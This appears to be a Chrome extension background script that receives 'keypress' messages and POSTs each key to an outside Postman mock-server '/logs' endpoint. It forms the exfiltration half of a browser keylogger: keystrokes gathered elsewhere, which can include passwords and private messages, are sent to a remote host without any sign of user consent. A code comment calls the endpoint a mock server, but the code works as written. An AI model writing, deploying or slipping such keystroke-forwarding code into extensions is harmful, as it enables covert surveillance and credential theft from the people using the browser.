chrome.runtime.onMessage.addListener(function (request) {
  if (request.type === 'keypress') {
    // Send the request to the mock server
    fetch('https://6b739089-33ad-4341-abd1-cb935076d4b5.mock.pstmn.io/logs', {
      method: 'POST',
      body: request.key
    })
      .then((response) => response.json())
      .then((json) => console.log(json));
  }
});
